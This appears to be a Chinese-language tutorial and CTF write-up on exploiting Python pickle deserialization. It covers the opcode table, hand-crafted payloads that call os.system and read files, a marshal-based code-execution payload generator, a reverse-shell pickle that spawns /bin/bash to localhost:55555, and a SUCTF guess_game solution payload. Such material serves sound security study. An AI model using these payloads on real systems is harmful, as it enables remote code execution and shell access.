        <h1 id="python-pickle"><a href="#python-pickle" class="headerlink" title="python pickle"></a>python pickle</h1><h2 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h2><p> <a target="_blank" rel="noopener" href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p>
<p>z牛: <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188981">https://www.anquanke.com/post/id/188981</a> </p>
<h2 id="pickle操作码大全-v0"><a href="#pickle操作码大全-v0" class="headerlink" title="pickle操作码大全(v0)"></a>pickle操作码大全(v0)</h2><p>有啥不懂的直接看源码把(z牛)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="pickle介绍"><a href="#pickle介绍" class="headerlink" title="pickle介绍"></a>pickle介绍</h2><h3 id="pickle的大致过程"><a href="#pickle的大致过程" class="headerlink" title="pickle的大致过程"></a>pickle的大致过程</h3><p>以Foo类为例</p>
<ol>
<li>提取出Foo类中的所有attribute(从<code>__dict__</code>中获得)将其转化为键值对</li>
<li>写入对象类名</li>
<li>写入第一步生成的键值对</li>
</ol>
<h3 id="unpickle的大致过程"><a href="#unpickle的大致过程" class="headerlink" title="unpickle的大致过程"></a>unpickle的大致过程</h3><ol>
<li>获取pickle流</li>
<li>重新构建属性列表</li>
<li>根据保存的类名来创建对象</li>
<li>将属性列表恢复到对象中</li>
</ol>
<h3 id="pvm组成-解析pickle"><a href="#pvm组成-解析pickle" class="headerlink" title="pvm组成(解析pickle)"></a>pvm组成(解析pickle)</h3><ol>
<li>指令解释器<br>最后一步一定是返回栈顶元素</li>
<li>栈 </li>
<li>memo(临时保存数据)<br>用类似list的方式来读取和储存数据,以字典方式实现<br>如p100,意为把栈顶元素保存到memo中索引为100</li>
</ol>
<h3 id="pvm指令格式"><a href="#pvm指令格式" class="headerlink" title="pvm指令格式"></a>pvm指令格式</h3><ol>
<li><p>pvm的操作码只有一个字节</p>
</li>
<li><p>需要参数的操作码,要在每一个参数后面加上换行符</p>
</li>
<li><p>从pickle流中读取数据,并加载到栈上</p>
</li>
</ol>
<h2 id="如何生成pickle"><a href="#如何生成pickle" class="headerlink" title="如何生成pickle"></a>如何生成pickle</h2><h3 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h3><h4 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>加载到栈上的数据类型</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>S</td>
<td>string</td>
<td>String</td>
<td>S’foo’\n</td>
</tr>
<tr>
<td>V</td>
<td>unicode</td>
<td>unicode</td>
<td>Vfo\u006f\n</td>
</tr>
<tr>
<td>I</td>
<td>int</td>
<td>int</td>
<td>I42\n</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="修改栈-memo"><a href="#修改栈-memo" class="headerlink" title="修改栈/memo"></a>修改栈/memo</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>(</td>
<td>MARK</td>
<td>向栈中加入一个标记</td>
<td>(</td>
</tr>
<tr>
<td>0</td>
<td>POP</td>
<td>弹出栈顶元素并丢弃</td>
<td>0</td>
</tr>
<tr>
<td>p<code>&lt;memo_index&gt;</code>\n</td>
<td>PUT</td>
<td>复制栈顶元素到memo中</td>
<td>p101\n</td>
</tr>
<tr>
<td>g<code>&lt;memo_index&gt;</code>\n</td>
<td>GET</td>
<td>将memo中指定元素拷贝到栈顶</td>
<td>g101\n</td>
</tr>
</tbody></table>
<h4 id="生成-修改列表-字典-元组"><a href="#生成-修改列表-字典-元组" class="headerlink" title="生成/修改列表,字典,元组"></a>生成/修改列表,字典,元组</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>l</td>
<td>列表</td>
<td>将栈顶到遇到的第一个mask之间的元素到一个列表,并将这个列表放入栈中</td>
<td>(S’string’\nl</td>
</tr>
<tr>
<td>t</td>
<td>元组</td>
<td>将栈顶到遇到的第一个mask之间的元素放到一个元组中,并将这个元组放入栈中</td>
<td>(S’string’\nS’string2’\nt</td>
</tr>
<tr>
<td>d</td>
<td>字典</td>
<td>将栈顶到遇到的第一个mask之间的元素放到一个字典中,并将这个字典放入栈中</td>
<td>(S’key1’\nS’value1’\nS’key2’\nS’value2’\nd</td>
</tr>
<tr>
<td>s</td>
<td>SETITEM</td>
<td>从栈出弹出三个值:字典,键,值,将键值对合并到字典中</td>
<td>(S’key1’\nS’val1’\nS’key2’\nI123\ndS’key3’\nS’val 3’\ns</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="pickle-流生成元组的过程"><a href="#pickle-流生成元组的过程" class="headerlink" title="pickle 流生成元组的过程"></a>pickle 流生成元组的过程</h4><ul>
<li><p>生成元组的指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(S&#x27;str1&#x27;</span><br><span class="line">S&#x27;str2&#x27;</span><br><span class="line">I1234</span><br><span class="line">t</span><br></pre></td></tr></table></figure></li>
<li><p>生成元组的过程图</p>
</li>
</ul>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vcyoggx7j310z0fs74s.jpg" alt="image5192"></p>
<h4 id="加载对象"><a href="#加载对象" class="headerlink" title="加载对象"></a>加载对象</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>GLOBAL</td>
<td>需要两个参数(module,class)来创建对象,并将其放到栈中</td>
<td>cos\nsystem\n</td>
</tr>
<tr>
<td>R</td>
<td>REDUCE</td>
<td>弹出一个参数元组和一个可调用对象（可能是由GLOBAL加载的），将参数应用于可调用对象并将结果压入栈中</td>
<td>cos\nsystem\n(S’sleep 10’\ntR</td>
</tr>
</tbody></table>
<h4 id="加载对象过程图"><a href="#加载对象过程图" class="headerlink" title="加载对象过程图"></a>加载对象过程图</h4><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebew5nvj312p0j8jto.jpg" alt="image5725"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebmas4ij31350k30v4.jpg" alt="image5808"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebufeq6j313g0mfq6a.jpg" alt="image5889"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec1wavgj312r0i3tb6.jpg" alt="image5970"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec9lsjpj31350iggo8.jpg" alt="image6051"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9aly1g9ved0gxklj31490l7q6n.jpg" alt="image6132"></p>
<h2 id="编写pickle的一些技巧"><a href="#编写pickle的一些技巧" class="headerlink" title="编写pickle的一些技巧"></a>编写pickle的一些技巧</h2><p>我们如何执行如下的代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;/path/to/massive/sikrit&#x27;</span>) </span><br><span class="line">f.read()</span><br></pre></td></tr></table></figure>

<p>思路是:首先执行open函数,将其储存在memo里面,在利用魔术方法来执行f.read()</p>
<p><code>f.read()</code>可以等价替换成<code>__builtin__.apply( __builtin__.getattr(file,&#39;read&#39;), [f])</code></p>
<p>最后合成的pickle是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#step1</span><br><span class="line">c__builtin__</span><br><span class="line">open</span><br><span class="line">(S&#x27;/path/to/massive/sikrit&#x27;</span><br><span class="line">tRp100</span><br><span class="line">#step2</span><br><span class="line">c__builtin__</span><br><span class="line">apply</span><br><span class="line">(c__builtin__</span><br><span class="line">getattr</span><br><span class="line">(c__builtin__</span><br><span class="line">file</span><br><span class="line">S&#x27;read&#x27;</span><br><span class="line">tR(g100</span><br><span class="line">ltR.</span><br></pre></td></tr></table></figure>



<h3 id="手写pickle模板"><a href="#手写pickle模板" class="headerlink" title="手写pickle模板"></a>手写pickle模板</h3><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9xumsbi3oj30qg0hoad6.jpg" alt="image6628"></p>
<h3 id="利用-reduce-来生成pickle代码"><a href="#利用-reduce-来生成pickle代码" class="headerlink" title="利用__reduce__来生成pickle代码"></a>利用<code>__reduce__</code>来生成pickle代码</h3><p><code>__reduce__</code></p>
<blockquote>
<p>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。 </p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;ls&#x27;</span>,))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Test(), protocol=<span class="number">0</span>))</span><br></pre></td></tr></table></figure>



<h3 id="利用marshal和cPickle来生成代码"><a href="#利用marshal和cPickle来生成代码" class="headerlink" title="利用marshal和cPickle来生成代码"></a>利用marshal和cPickle来生成代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;bit4&#x27;</span></span><br><span class="line">__github__ = <span class="string">&#x27;https://github.com/bit4woo&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span><span class="comment">#you should write your code in this function</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n-<span class="number">1</span>) + fib(n-<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;fib(10) =&#x27;</span>, fib(<span class="number">10</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#为了保证code_serialized中的内容得到执行，我们需要如下代码</span></span><br><span class="line"><span class="comment">#(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), &#x27;&#x27;))()</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;%s&#x27;</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span> % base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>



<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><h3 id="通过源码查看pickle的方法"><a href="#通过源码查看pickle的方法" class="headerlink" title="通过源码查看pickle的方法"></a>通过源码查看pickle的方法</h3><p>直接所有操作码对应的变量</p>
<p><img src="https://i.loli.net/2019/12/23/pWlFyYPKB7enMQE.png" alt="image7895"></p>
<p><code> dispatch[BININT1[0]] = load_binint1</code></p>
<p>找到类似这种的后面的就是对应的函数</p>
<h2 id="pickle工具"><a href="#pickle工具" class="headerlink" title="pickle工具"></a>pickle工具</h2><p> <a target="_blank" rel="noopener" href="https://github.com/sensepost/anapickle">converttopickle.py</a></p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p> <a target="_blank" rel="noopener" href="https://github.com/sensepost/anapickle/blob/master/anapickle.py">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a> </p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS&#x27;__getitem__&#x27;\ntRp102\n0g102\n(S&#x27;AF_INET&#x27;\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS&#x27;__getitem__&#x27;\ntRp105\n0g105\n(S&#x27;SOCK_STREAM&#x27;\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS&#x27;__getitem__&#x27;\ntRp108\n0g108\n(S&#x27;IPPROTO_TCP&#x27;\ntRp106\n0csocket\n__dict__\np110\n0c__builtin__\ngetattr\n(g110\nS&#x27;__getitem__&#x27;\ntRp111\n0g111\n(S&#x27;SOL_SOCKET&#x27;\ntRp109\n0csocket\n__dict__\np113\n0c__builtin__\ngetattr\n(g113\nS&#x27;__getitem__&#x27;\ntRp114\n0g114\n(S&#x27;SO_REUSEADDR&#x27;\ntRp112\n0csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#x27;setsockopt&#x27;\ntRp116\n0c__builtin__\napply\n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#x27;connect&#x27;\ntRp118\n0c__builtin__\napply\n(g118\n(g115\n(S&#x27;localhost&#x27;\nI55555\ntltRp119\n0c__builtin__\ngetattr\n(csocket\n_socketobject\nS&#x27;fileno&#x27;\ntRp120\n0c__builtin__\napply\n(g120\n(g115\nltRp121\n0c__builtin__\nint\n(g121\ntRp122\n0csubprocess\nPopen\n((S&#x27;/bin/bash&#x27;\ntI0\nS&#x27;/bin/bash&#x27;\ng122\ng122\ng122\ntRp123\n0S&#x27;finished&#x27;\n.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>localhost:55555</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
<li>使用v0版的pickle协议,保证shellcode的通用性</li>
</ol>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="suctf-guess-game"><a href="#suctf-guess-game" class="headerlink" title="suctf guess_game"></a>suctf guess_game</h3><p><a target="_blank" rel="noopener" href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game">题目链接</a></p>
<p>考点:pickle</p>
<p>代码审计一波后</p>
<p>如果猜对10次后会给flag(机会只有10次)</p>
<p>因为知道是考pickle直接全局搜索pickle发现在server处有</p>
<p><code>ticket = restricted_loads(ticket)</code></p>
<p>其中ticket是我们可控点</p>
<p>跟进去看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="comment"># Only allow safe classes</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;guess_game&quot;</span> == module[<span class="number">0</span>:<span class="number">10</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure>

<p>我们只能加载guess_game中的类,并且不能调用魔术方法.</p>
<p>在这一题中拿到flag有两种方式:</p>
<ol>
<li>命令执行</li>
<li>通过游戏</li>
</ol>
<p>在怼着find_class许久之后发现没办法绕过,于是只能走通过游戏这一条路了</p>
<p>而游戏中判定赢的条件是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span></span><br><span class="line"><span class="class">	<span class="title">def</span> <span class="title">is_win</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.win_count == max_round</span><br></pre></td></tr></table></figure>

<p>如果我们能直接修改win_count或者max_round就可以拿到flag了</p>
<p>我们发现在<code>guess_game</code>中已经有一个<code>game = Game()</code>这个了,也就是我们可以利用pickle来加载这个game直接修改</p>
<p>那么接下来就是如何修改了</p>
<p>在pickle的操作码中我们发现</p>
<p><code>BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()</code>这一条</p>
<p>其中update()就可以修改game的属性了</p>
<p>那么接下来就只有一个问题了,操作码<code>b</code>如何使用</p>
<p>一路跟踪发现b操作码的实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_build</span>(<span class="params">self</span>):</span></span><br><span class="line">    stack = self.stack</span><br><span class="line">    state = stack.pop()</span><br><span class="line">    inst = stack[-<span class="number">1</span>]</span><br><span class="line">    setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        setstate(state)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    slotstate = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">        state, slotstate = state</span><br><span class="line">    <span class="keyword">if</span> state:</span><br><span class="line">        inst_dict = inst.__dict__</span><br><span class="line">        intern = sys.intern</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                inst_dict[intern(k)] = v</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                inst_dict[k] = v</span><br><span class="line">    <span class="keyword">if</span> slotstate:</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">            <span class="built_in">setattr</span>(inst, k, v)</span><br></pre></td></tr></table></figure>

<p>没有调用参数,栈顶应为字典,栈顶的下面是要修改的对象</p>
<p>最后的payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&quot;cguess_game\ngame\n(S&#x27;win_count&#x27;\nI10\nS&#x27;round_count&#x27;\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x01sb.&quot;</span></span><br></pre></td></tr></table></figure>



